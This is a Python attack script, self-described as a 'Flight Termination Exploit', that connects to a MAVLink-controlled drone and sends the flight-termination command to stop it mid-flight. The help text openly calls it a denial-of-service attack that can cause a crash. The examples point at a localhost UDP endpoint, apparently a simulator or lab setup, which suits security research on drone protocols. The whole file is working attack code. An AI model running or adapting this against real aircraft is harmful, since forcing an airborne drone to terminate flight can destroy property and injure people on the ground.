#!/usr/bin/env python3
"""
Flight Termination Exploit Script
Sends flight termination command to immediately stop drone flight
"""

import sys
import time
from pymavlink import mavutil

def send_flight_termination(connection, enable=True):
    """
    Send flight termination command
    
    Args:
        connection: MAVLink connection object
        enable: True to terminate, False to cancel termination
    
    Returns:
        True if command sent successfully
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    if enable:
        print("[*] Sending FLIGHT TERMINATION command...")
        print("[!] WARNING: This will immediately stop the drone!")
    else:
        print("[*] Canceling flight termination...")
    
    # Send MAV_CMD_DO_FLIGHTTERMINATION
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
        0,  # confirmation
        1 if enable else 0,  # param1: 1 = terminate, 0 = cancel
        0, 0, 0, 0, 0, 0, 0
    )
    
    # Wait for acknowledgment
    time.sleep(1)
    msg = connection.recv_match(type='COMMAND_ACK', blocking=True, timeout=3)
    
    if msg:
        if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
            if enable:
                print("[+] Flight termination command ACCEPTED")
                print("[!] Drone will terminate flight immediately")
            else:
                print("[+] Flight termination canceled")
            return True
        else:
            print(f"[-] Command rejected: {msg.result}")
            return False
    else:
        print("[!] No acknowledgment received (command may still be processed)")
        return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 flight_termination.py <connection> [cancel]")
        print("Example: python3 flight_termination.py udp:127.0.0.1:14550")
        print("Example: python3 flight_termination.py udp:127.0.0.1:14550 cancel")
        print("\nWARNING: This command will immediately terminate drone flight!")
        print("This is a denial-of-service attack that can cause:")
        print("  - Immediate flight stop")
        print("  - Emergency landing")
        print("  - Potential crash if drone is airborne")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    cancel = 'cancel' in sys.argv
    
    # Use helper function for connection
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).parent.parent / 'utils'))
    from mavlink_helper import connect_to_drone
    
    print(f"[*] Connecting to {connection_string}...")
    connection = connect_to_drone(connection_string, timeout=5)
    if connection is None:
        sys.exit(1)
    print("[+] Connected to vehicle")
    
    # Send flight termination
    success = send_flight_termination(connection, enable=not cancel)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
